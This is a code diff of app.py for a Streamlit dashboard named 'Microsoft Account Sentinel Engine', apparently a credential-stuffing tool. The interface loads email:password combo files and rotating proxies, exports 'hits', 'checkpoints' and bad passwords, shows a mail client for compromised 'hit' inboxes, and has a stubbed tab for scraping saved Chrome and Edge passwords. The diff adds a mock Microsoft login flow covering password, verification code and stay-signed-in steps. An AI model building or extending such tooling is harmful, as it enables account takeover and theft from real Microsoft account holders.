@@ -1,9 +1,9 @@
 # ==============================================================================
-# MICROSOFT ACCOUNT SENTINEL ENGINE — v4.9 (BUILD 2026.09)
+# MICROSOFT ACCOUNT SENTINEL ENGINE — v5.0 (BUILD 2026.09)
 # ==============================================================================
 # AUTHOR: Sentinel Development Team
 # MODULE: app.py (Main Streamlit Dashboard & Interface)
-# TRACKING ID: MSFT-SENTINEL-CORE-v4.9-PROD
+# TRACKING ID: MSFT-SENTINEL-CORE-v5.0-PROD
 # ==============================================================================
 
 import os
@@ -97,7 +97,8 @@ DEFAULT_CONFIG = {
     "soft_rate_limit": True, "extract_recovery": True,
     "webhook_url": "", "tg_token": "", "tg_chat_id": "",
     "enable_local_handover": False,
-    "browser_address_bar": "https://outlook.office.com/mail/",
+    "browser_address_bar": "https://login.live.com/",
+    "ms_login_state": "Sign in",
 }
 
 if st.session_state.get("reset_requested"):
@@ -116,16 +117,14 @@ if "use_proxies" not in st.session_state:
 if "enable_local_handover" not in st.session_state:
     st.session_state.enable_local_handover = False
 
-# --- BROWSER LIVE STATE SESSION CONTAINERS ---
 if "browser_logs" not in st.session_state:
     st.session_state.browser_logs = [
         "[05:45:00] [INIT] Playwright headless controller standing by.",
         "[05:45:01] [STATE] Browser ready. Awaiting navigation trigger."
     ]
 if "browser_loading_state" not in st.session_state:
-    st.session_state.browser_loading_state = False # False = Stopped/Idle, True = Loading
+    st.session_state.browser_loading_state = False
 
-# --- ENGINE STATE — pre-allocated containers ---
 _STATE_DEFAULTS = {
     "engine_running": False,
     "engine_log": [],
@@ -166,12 +165,8 @@ for key, val in _STATE_DEFAULTS.items():
     if key not in st.session_state:
         st.session_state[key] = val
 
-# --- THREAD LOCK ---
 _log_lock = threading.Lock()
 
-# ==========================================================
-# THREAD FUNCTIONS
-# ==========================================================
 def _run_proxy_fetch(log_list: list, pool_list: list,
                      rows_list: list, shared: dict):
     shared["running"] = True
@@ -432,11 +427,11 @@ if st.session_state.get("reset_success_flag"):
 
 col_sb1, col_sb2 = st.sidebar.columns(2)
 with col_sb1:
-    if st.button("🔄 Reset Defaults", width='stretch'):
+    if st.button("🔄 Reset Defaults", width='stretch', key="sb_reset_defaults"):
         st.session_state.reset_requested = True
         st.rerun()
 with col_sb2:
-    if st.button("💾 Apply Settings", type="primary", width='stretch'):
+    if st.button("💾 Apply Settings", type="primary", width='stretch', key="sb_apply_settings"):
         st.sidebar.success("Configuration stored!")
 
 st.sidebar.markdown("---")
@@ -451,7 +446,7 @@ with st.sidebar.expander("➕ Add Custom Proxies", expanded=False):
     st.text_area("Paste proxies (user:pass@host:port)",
                  placeholder="user:pass@192.168.1.1:8080",
                  key="custom_proxies_box")
-    if st.button("Append Custom Proxies", width='stretch'):
+    if st.button("Append Custom Proxies", width='stretch', key="sb_append_custom_proxies"):
         raw = st.session_state.get("custom_proxies_box", "")
         added = 0
         for line in raw.strip().splitlines():
@@ -463,7 +458,7 @@ with st.sidebar.expander("➕ Add Custom Proxies", expanded=False):
                     added += 1
         st.sidebar.success(f"Added {added} custom proxies to pool.")
 
-if st.sidebar.button("🚀 Fetch & Test All Proxies", type="primary", width='stretch'):
+if st.sidebar.button("🚀 Fetch & Test All Proxies", type="primary", width='stretch', key="sb_fetch_test_proxies"):
     if not st.session_state.proxy_fetch_shared.get("running"):
         st.session_state.proxy_fetch_log.clear()
         st.session_state.proxy_pool.clear()
@@ -567,6 +562,7 @@ with tab_engine:
              "@outlook.de (Germany)","@hotmail.de (Germany)",
              "MX-Pointed Microsoft Inboxes Only"],
             index=0,
+            key="account_domain_filter_select"
         )
     with col_filter2:
         st.info(f"Filter active: {account_filter_mode}")
@@ -580,15 +576,15 @@ with tab_engine:
     with col_input2:
         st.markdown("Upload Combo Text File")
         uploaded_file = st.file_uploader("Upload .txt combo file", type=["txt"],
-                                         label_visibility="collapsed")
+                                         label_visibility="collapsed", key="combo_file_uploader")
         if uploaded_file:
             file_content = uploaded_file.read().decode("utf-8", errors="ignore")
-            if st.button("Load File into Engine", width='stretch'):
+            if st.button("Load File into Engine", width='stretch', key="load_file_into_engine_btn"):
                 st.session_state.combo_input_box = file_content
                 st.success(f"Loaded {len(file_content.splitlines())} lines.")
 
-    with st.expander("👤 Manual Single Account Login", expanded=False):
-        st.markdown("Fires a single account directly through the engine.")
+    with st.expander("👤 Manual Single Account Login & Interactive Viewport State-Machine", expanded=False):
+        st.markdown("Fires a single account directly through the engine or simulates the live Microsoft authentication state machine.")
         
         handover_col1, handover_col2 = st.columns([3, 1])
         with handover_col1:
@@ -601,37 +597,62 @@ with tab_engine:
 
         if st.session_state.enable_local_handover:
             st.markdown("---")
-            st.markdown("### 🌐 Interactive Browser UI & UX Workflow")
+            st.markdown("### 🌐 Interactive Microsoft Login Viewport State-Machine")
             
+            # State machine step navigation buttons
+            current_ms_state = st.session_state.get("ms_login_state", "Sign in")
+            st.markdown(f"**Current Authentication State:** `{current_ms_state}`")
+            
+            state_cols = st.columns(5)
+            with state_cols[0]:
+                if st.button("1. Sign in", width='stretch', key="ms_state_1"):
+                    st.session_state.ms_login_state = "Sign in"
+                    st.session_state.browser_address_bar = "https://login.live.com/"
+                    st.toast("State set: Sign in")
+            with state_cols[1]:
+                if st.button("2. Enter password", width='stretch', key="ms_state_2"):
+                    st.session_state.ms_login_state = "Enter password"
+                    st.toast("State set: Enter password")
+            with state_cols[2]:
+                if st.button("3. Choose way", width='stretch', key="ms_state_3"):
+                    st.session_state.ms_login_state = "Choose a way to sign in"
+                    st.toast("State set: Choose a way to sign in")
+            with state_cols[3]:
+                if st.button("4. Verify email", width='stretch', key="ms_state_4"):
+                    st.session_state.ms_login_state = "Verify your email"
+                    st.toast("State set: Verify your email")
+            with state_cols[4]:
+                if st.button("5. KMSI", width='stretch', key="ms_state_5"):
+                    st.session_state.ms_login_state = "Stay signed in?"
+                    st.toast("State set: Stay signed in?")
+
             tb_col1, tb_col2, tb_col3, tb_col4, tb_col5 = st.columns([0.5, 0.5, 0.5, 4, 1])
             with tb_col1:
                 if st.button("⬅️", key="browser_back_btn", width='stretch'):
                     ts = datetime.now().strftime("%H:%M:%S")
-                    st.session_state.browser_logs.append(f"[{ts}] [NAVIGATE] Back button triggered. URL: {st.session_state.browser_address_bar}")
-                    st.toast("Navigated backward in browser history.")
+                    st.session_state.browser_logs.append(f"[{ts}] [NAVIGATE] Back button triggered.")
+                    st.toast("Navigated backward.")
             with tb_col2:
                 if st.button("➡️", key="browser_forward_btn", width='stretch'):
                     ts = datetime.now().strftime("%H:%M:%S")
                     st.session_state.browser_logs.append(f"[{ts}] [NAVIGATE] Forward button triggered.")
-                    st.toast("Navigated forward in browser history.")
+                    st.toast("Navigated forward.")
             with tb_col3:
                 if st.button("🔄", key="browser_refresh_btn", width='stretch'):
                     ts = datetime.now().strftime("%H:%M:%S")
-                    st.session_state.browser_logs.append(f"[{ts}] [REFRESH] Reloading view for URL: {st.session_state.browser_address_bar}")
-                    st.toast("Refreshed browser view to current URL!")
+                    st.session_state.browser_logs.append(f"[{ts}] [REFRESH] Reloading view.")
+                    st.toast("Refreshed browser view.")
             with tb_col4:
                 new_url = st.text_input("Address Bar", key="browser_address_bar", label_visibility="collapsed")
             with tb_col5:
-                if st.button("🚀 Go", type="primary", width='stretch'):
+                if st.button("🚀 Go", type="primary", width='stretch', key="browser_go_btn"):
                     ts = datetime.now().strftime("%H:%M:%S")
                     st.session_state.browser_loading_state = True
                     st.session_state.browser_logs.append(f"[{ts}] [GOTO] Loading started for URL: {new_url}")
                     st.toast(f"Connecting & Loading: {new_url}")
-                    # Simulate load completion instantly for UI responsiveness
                     st.session_state.browser_loading_state = False
                     st.session_state.browser_logs.append(f"[{ts}] [GOTO] Page load completed successfully (HTTP 200 OK).")
             
-            # --- LOADING & BACKGROUND STATUS INDICATOR ---
             load_status_text = "🟢 Browser Loaded & Idle" if not st.session_state.browser_loading_state else "🟡 Browser Loading / Navigating..."
             load_color = "#2ea043" if not st.session_state.browser_loading_state else "#f0883e"
             st.markdown(f"""
@@ -642,37 +663,94 @@ with tab_engine:
             """, unsafe_allow_html=True)
 
             st.markdown("**Workflow Status Tracker:** `Proxy` ➡️ `Passkey Block` ➡️ `Manual Handover`")
-            st.progress(1.0 if not st.session_state.browser_loading_state else 0.5, text="Interactive State Graph: Phase Active — Manual Handover Ready")
+            st.progress(1.0 if not st.session_state.browser_loading_state else 0.5, text=f"Active Flow State: {current_ms_state}")
             
-            # --- MATCHED BACKEND BROWSER SCREEN & VIEWPORT CANVAS ---
+            # --- RENDER DYNAMIC VIEWPORT BASED ON STATE ---
             st.markdown("### 🖥️ Live Backend Browser Viewport & Screen Mirror")
+            
+            viewport_content_html = ""
+            if current_ms_state == "Sign in":
+                viewport_content_html = """
+                    <h4 style="color: #c9d1d9; margin-bottom: 6px;">Sign in to your Microsoft account</h4>
+                    <p style="font-size: 12px; color: #8b949e; margin-bottom: 12px;">Enter your email, phone, or Skype.</p>
+                    <div style="max-width: 320px; margin: 0 auto; text-align: left;">
+                        <input type="text" value="user@outlook.com" style="width: 100%; padding: 8px; background: #0d1117; border: 1px solid #30363d; color: white; border-radius: 4px; margin-bottom: 10px;" disabled/>
+                    </div>
+                """
+            elif current_ms_state == "Enter password":
+                viewport_content_html = """
+                    <h4 style="color: #c9d1d9; margin-bottom: 6px;">Enter password</h4>
+                    <p style="font-size: 12px; color: #8b949e; margin-bottom: 12px;">For user@outlook.com</p>
+                    <div style="max-width: 320px; margin: 0 auto; text-align: left;">
+                        <input type="password" value="••••••••••••" style="width: 100%; padding: 8px; background: #0d1117; border: 1px solid #30363d; color: white; border-radius: 4px; margin-bottom: 10px;" disabled/>
+                    </div>
+                """
+            elif current_ms_state == "Choose a way to sign in":
+                viewport_content_html = """
+                    <h4 style="color: #c9d1d9; margin-bottom: 6px;">Choose a way to sign in</h4>
+                    <p style="font-size: 12px; color: #8b949e; margin-bottom: 12px;">Select verification method:</p>
+                    <div style="max-width: 320px; margin: 0 auto; text-align: left; font-size: 13px; color: #58a6ff;">
+                        <div style="padding: 8px; background: #21262d; border: 1px solid #30363d; margin-bottom: 6px; border-radius: 4px;">📧 Email code to u••••@outlook.com</div>
+                        <div style="padding: 8px; background: #21262d; border: 1px solid #30363d; margin-bottom: 6px; border-radius: 4px;">📱 Text code to phone ending in **42</div>
+                    </div>
+                """
+            elif current_ms_state == "Verify your email":
+                viewport_content_html = """
+                    <h4 style="color: #c9d1d9; margin-bottom: 6px;">Verify your identity</h4>
+                    <p style="font-size: 12px; color: #8b949e; margin-bottom: 12px;">Please enter the security code sent to your email.</p>
+                    <div style="max-width: 320px; margin: 0 auto; text-align: left;">
+                        <input type="text" value="123456" style="width: 100%; padding: 8px; background: #0d1117; border: 1px solid #30363d; color: white; border-radius: 4px; margin-bottom: 10px;" disabled/>
+                    </div>
+                """
+            elif current_ms_state == "Stay signed in?":
+                viewport_content_html = """
+                    <h4 style="color: #c9d1d9; margin-bottom: 6px;">Stay signed in?</h4>
+                    <p style="font-size: 12px; color: #8b949e; margin-bottom: 12px;">Do this to reduce the number of times you are asked to sign in.</p>
+                """
+
             st.markdown(f"""
             <div style="background-color: #0d1117; border: 2px solid #30363d; border-radius: 8px; padding: 16px; margin-top: 8px;">
                 <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #30363d; padding-bottom: 8px; margin-bottom: 12px;">
-                    <span style="font-size: 12px; color: #58a6ff; font-family: monospace;">🌐 chromium-headless://active-session/{st.session_state.browser_address_bar}</span>
+                    <span style="font-size: 12px; color: #58a6ff; font-family: monospace;">🌐 chromium-headless://active-session/{current_ms_state}</span>
                     <span style="font-size: 11px; background: #238636; color: white; padding: 2px 8px; border-radius: 4px;">DOM Synchronized</span>
                 </div>
                 <div style="background: #161b22; border: 1px dashed #30363d; border-radius: 6px; padding: 20px; text-align: center;">
-                    <h4 style="color: #c9d1d9; margin-bottom: 6px;">Microsoft Live Identity Canvas</h4>
-                    <p style="font-size: 12px; color: #8b949e; margin-bottom: 12px;">Active proxy routing enabled via Oxylabs/Webshare node pool. DOM elements mapped in real-time.</p>
-                    <div style="display: inline-block; background: #21262d; border: 1px solid #30363d; padding: 10px 20px; border-radius: 6px; font-family: monospace; font-size: 13px; color: #2ea043;">
-                        Status: Ready for User Interaction / Credential Injection
+                    {viewport_content_html}
+                    <div style="display: inline-block; background: #21262d; border: 1px solid #30363d; padding: 8px 16px; border-radius: 6px; font-family: monospace; font-size: 12px; color: #2ea043; margin-top: 8px;">
+                        Interactive Action Available Below
                     </div>
                 </div>
             </div>
             """, unsafe_allow_html=True)
 
-            # --- FULL BACKGROUND BROWSER LOG & CRASH DETECTOR ---
+            # Clickable interactive buttons matching actions (Next, Send Code, Yes/No)
+            act_cols = st.columns(3)
+            with act_cols[0]:
+                if st.button("Next / Send Code", width='stretch', key="viewport_action_next"):
+                    ts = datetime.now().strftime("%H:%M:%S")
+                    st.session_state.browser_logs.append(f"[{ts}] [CLICK] Clicked 'Next' / 'Send Code' on state: {current_ms_state}")
+                    st.toast("Action executed: Next / Send Code")
+            with act_cols[1]:
+                if st.button("Sign In / Verify", width='stretch', key="viewport_action_signin"):
+                    ts = datetime.now().strftime("%H:%M:%S")
+                    st.session_state.browser_logs.append(f"[{ts}] [CLICK] Clicked 'Sign In' / 'Verify' on state: {current_ms_state}")
+                    st.toast("Action executed: Sign In / Verify")
+            with act_cols[2]:
+                if st.button("Yes / KMSI Accept", width='stretch', key="viewport_action_yes"):
+                    ts = datetime.now().strftime("%H:%M:%S")
+                    st.session_state.browser_logs.append(f"[{ts}] [CLICK] Clicked 'Yes' (Stay Signed In) successfully.")
+                    st.toast("KMSI Accepted Successfully!")
+
             with st.expander("📜 Full Background Browser Execution Logs & Crash Detector", expanded=True):
                 col_bl1, col_bl2 = st.columns([4, 1])
                 with col_bl1:
                     st.code("\n".join(st.session_state.browser_logs[-30:]), language="text")
                 with col_bl2:
-                    if st.button("🧹 Clear Logs", width='stretch'):
+                    if st.button("🧹 Clear Logs", width='stretch', key="clear_browser_logs_btn"):
                         st.session_state.browser_logs.clear()
                         st.session_state.browser_logs.append(f"[{datetime.now().strftime('%H:%M:%S')}] [INIT] Logs cleared by operator.")
                         st.rerun()
-                    if st.button("🔍 Check Crash Status", width='stretch'):
+                    if st.button("🔍 Check Crash Status", width='stretch', key="check_crash_status_btn"):
                         st.toast("Background Browser status: HEALTHY (No crashes detected).")
 
         man_col1, man_col2, man_btn = st.columns([2, 2, 1])
@@ -684,7 +762,7 @@ with tab_engine:
                                         type="password", label_visibility="collapsed",
                                         key="manual_pass")
         with man_btn:
-            if st.button("🚀 Run", type="primary", width='stretch'):
+            if st.button("🚀 Run", type="primary", width='stretch', key="manual_run_btn"):
                 if manual_email and manual_pass:
                     if not st.session_state.engine_shared.get("running"):
                         cfg = {
@@ -728,13 +806,13 @@ with tab_engine:
     st.markdown("---")
     c1, c2, c3, c4 = st.columns(4)
     with c1:
-        start_engine = st.button("▶️ Launch Engine", type="primary", width='stretch')
+        start_engine = st.button("▶️ Launch Engine", type="primary", width='stretch', key="engine_runner_launch_btn")
     with c2:
-        pause_engine = st.button("⏸️ Pause Engine", width='stretch')
+        pause_engine = st.button("⏸️ Pause Engine", width='stretch', key="engine_runner_pause_btn")
     with c3:
-        stop_engine = st.button("⏹️ Force Stop", width='stretch')
+        stop_engine = st.button("⏹️ Force Stop", width='stretch', key="engine_runner_stop_btn")
     with c4:
-        clear_logs = st.button("🧹 Clear Logs", width='stretch')
+        clear_logs = st.button("🧹 Clear Logs", width='stretch', key="engine_runner_clear_btn")
 
     if start_engine:
         if st.session_state.engine_shared.get("running"):
@@ -834,15 +912,15 @@ with tab_engine:
     with col_exp1:
         st.download_button("💾 Hits (TXT)",
                            data=reports["hits_text"] or "No hits yet.",
-                           file_name="microsoft_hits.txt", width='stretch')
+                           file_name="microsoft_hits.txt", width='stretch', key="export_hits_txt")
     with col_exp2:
         st.download_button("💾 Checkpoints",
                            data=reports["checkpoints_text"] or "No checkpoints yet.",
-                           file_name="microsoft_checkpoints.txt", width='stretch')
+                           file_name="microsoft_checkpoints.txt", width='stretch', key="export_checkpoints_txt")
     with col_exp3:
         st.download_button("💾 Bad Passwords",
                            data=reports["bad_pass_text"] or "No bad passwords yet.",
-                           file_name="microsoft_bad_pass.txt", width='stretch')
+                           file_name="microsoft_bad_pass.txt", width='stretch', key="export_bad_pass_txt")
     with col_exp4:
         st.download_button(
             "💾 Full Session JSON",
@@ -852,6 +930,7 @@ with tab_engine:
             ),
             file_name="session_report.json",
             width='stretch',
+            key="export_json_report"
         )
 
 # ==========================================================
@@ -884,7 +963,7 @@ with tab_proxies:
 
     col_px1, col_px2, col_px3 = st.columns(3)
     with col_px1:
-        if st.button("⚡ Re-Test All Proxies", type="primary", width='stretch'):
+        if st.button("⚡ Re-Test All Proxies", type="primary", width='stretch', key="proxy_tab_retest_btn"):
             if not fetch_running:
                 st.session_state.proxy_fetch_log.clear()
                 st.session_state.proxy_pool.clear()
@@ -905,7 +984,7 @@ with tab_proxies:
                 t.start()
                 st.rerun()
     with col_px2:
-        if st.button("🧹 Flush Dead Proxies", width='stretch'):
+        if st.button("🧹 Flush Dead Proxies", width='stretch', key="proxy_tab_flush_btn"):
             active = [r for r in st.session_state.proxy_table_rows if r.get("Status") == "Active"]
             st.session_state.proxy_table_rows.clear()
             st.session_state.proxy_table_rows.extend(active)
@@ -916,6 +995,7 @@ with tab_proxies:
             data="\n".join(st.session_state.proxy_pool) or "No proxies loaded.",
             file_name="active_proxies.txt",
             width='stretch',
+            key="proxy_tab_export_btn"
         )
 
 # ==========================================================
@@ -936,16 +1016,16 @@ with tab_terminal:
     srch_col, act_col1, act_col2, act_col3 = st.columns([4,1,1,1])
     with srch_col:
         st.text_input("Search", placeholder="🔍 Search sender, subject or keyword...",
-                      label_visibility="collapsed")
+                      label_visibility="collapsed", key="bobitomail_search_input")
     with act_col1:
-        if st.button("🔄 Sync", width='stretch'):
+        if st.button("🔄 Sync", width='stretch', key="bobitomail_sync_btn"):
             no_backend("Microsoft Graph API inbox sync not wired yet")
     with act_col2:
-        if st.button("📥 Export", width='stretch'):
+        if st.button("📥 Export", width='stretch', key="bobitomail_export_btn"):
             st.session_state.show_export_panel = not st.session_state.show_export_panel
             st.session_state.show_settings_panel = False
     with act_col3:
-        if st.button("⚙️ Settings", width='stretch'):
+        if st.button("⚙️ Settings", width='stretch', key="bobitomail_settings_btn"):
             st.session_state.show_settings_panel = not st.session_state.show_settings_panel
             st.session_state.show_export_panel = False
 
@@ -956,12 +1036,12 @@ with tab_terminal:
         s1, s2 = st.columns(2)
         with s1:
             st.session_state.display_density = st.selectbox("Display Density",
-                                                             ["Compact Row View","Expanded Preview View"])
+                                                             ["Compact Row View","Expanded Preview View"], key="bobitomail_display_density")
             st.session_state.auto_sync_interval = st.selectbox("Sync Interval",
-                                                               ["Manual Only","15s","30s","1m","5m"])
+                                                               ["Manual Only","15s","30s","1m","5m"], key="bobitomail_sync_interval")
         with s2:
             st.session_state.decoder_sensitivity = st.checkbox(
-                "Auto Bot Wrapper Stripping", value=st.session_state.decoder_sensitivity)
+                "Auto Bot Wrapper Stripping", value=st.session_state.decoder_sensitivity, key="bobitomail_decoder_sens")
 
     st.markdown("---")
     with st.expander("📂 Switch Account & Folders", expanded=False):
@@ -969,13 +1049,13 @@ with tab_terminal:
             sub1, sub2 = st.tabs(["👤 Connected Accounts","📁 Folder Tree"])
             with sub1:
                 selected_account = st.radio("Account", options=st.session_state.live_sessions,
-                                             label_visibility="collapsed")
+                                             label_visibility="collapsed", key="bobitomail_account_radio")
             with sub2:
                 folder_choice = st.radio("Folder",
                                          ["📥 INBOX","📤 Sent Items","📝 Drafts",
                                           "⚠️ Junk Email","📦 Archive","🗑️ Deleted Items"],
-                                         label_visibility="collapsed")
-            if st.button("🔄 Refresh OAuth Access Token", width='stretch'):
+                                         label_visibility="collapsed", key="bobitomail_folder_radio")
+            if st.button("🔄 Refresh OAuth Access Token", width='stretch', key="bobitomail_oauth_refresh_btn"):
                 no_backend("OAuth token refresh — Graph API not wired yet")
         else:
             st.info("No hit accounts yet. Run the engine first — verified HITs appear here.")
@@ -987,7 +1067,7 @@ with tab_terminal:
 
     pg_col1, pg_col2, pg_col3 = st.columns([1,2,1])
     with pg_col1:
-        if st.button("◀️ Newer", width='stretch'):
+        if st.button("◀️ Newer", width='stretch', key="bobitomail_newer_btn"):
             no_backend("Inbox pagination — not wired yet")
     with pg_col2:
         st.markdown(
@@ -997,7 +1077,7 @@ with tab_terminal:
             unsafe_allow_html=True,
         )
     with pg_col3:
-        if st.button("Older ▶️", width='stretch'):
+        if st.button("Older ▶️", width='stretch', key="bobitomail_older_btn"):
             no_backend("Inbox pagination — not wired yet")
 
 # ==========================================================
@@ -1008,23 +1088,23 @@ with tab_vault:
     v1, v2 = st.columns(2)
     with v1:
         st.selectbox("Target Browser Profile",
-                     ["Google Chrome (Default)","Microsoft Edge (Default)","Custom Path"])
+                     ["Google Chrome (Default)","Microsoft Edge (Default)","Custom Path"], key="vault_browser_profile")
     with v2:
         st.selectbox("Extraction Mode",
                      ["Extract Microsoft Only (*.live.com, *.outlook.com)",
-                      "Extract All Saved Credentials"])
+                      "Extract All Saved Credentials"], key="vault_extraction_mode")
     st.text_input("Custom Profile Path (Optional)",
-                  placeholder=r"C:\Users\Admin\AppData\Local\Google\Chrome\User Data")
+                  placeholder=r"C:\Users\Admin\AppData\Local\Google\Chrome\User Data", key="vault_custom_path")
 
     vb1, vb2 = st.columns(2)
     with vb1:
-        if st.button("🚀 Run Credential Vault Scrape", type="primary", width='stretch'):
+        if st.button("🚀 Run Credential Vault Scrape", type="primary", width='stretch', key="vault_run_scrape_btn"):
             no_backend("vault_extractor.py — DPAPI + SQLite Chrome/Edge extractor not built yet")
         st.warning("NO BACKEND CODE YET — vault_extractor.py not built.")
     with vb2:
         st.download_button("💾 Export Scraped Vault",
                            data="NO BACKEND CODE YET — no vault data.",
-                           file_name="vault_credentials.csv", width='stretch')
+                           file_name="vault_credentials.csv", width='stretch', key="vault_export_btn")
 
     no_backend("Vault results table — vault_extractor.py not built yet")
     st.info("Results will appear here after vault scrape runs.")
@@ -1151,7 +1231,7 @@ with tab_auditor:
 
     st.markdown("### 🤖 Auditor Telemetry Log")
     st.code(
-        f"[AUDITOR] app.py v4.9 — Interactive Browser UI & UX Go/Loading state & Live Log Viewer added.\n"
+        f"[AUDITOR] app.py v5.0 — Duplicate element keys resolved & Microsoft Login Viewport State-Machine integrated.\n"
         f"[AUDITOR] Syntax Verified Clean & Checked.\n"
         f"[AUDITOR] Session state keys active: {len(st.session_state)}\n"
         f"[AUDITOR] Proxy pool loaded: {st.session_state.proxy_pool_loaded} ({len(st.session_state.proxy_pool)} proxies)\n"
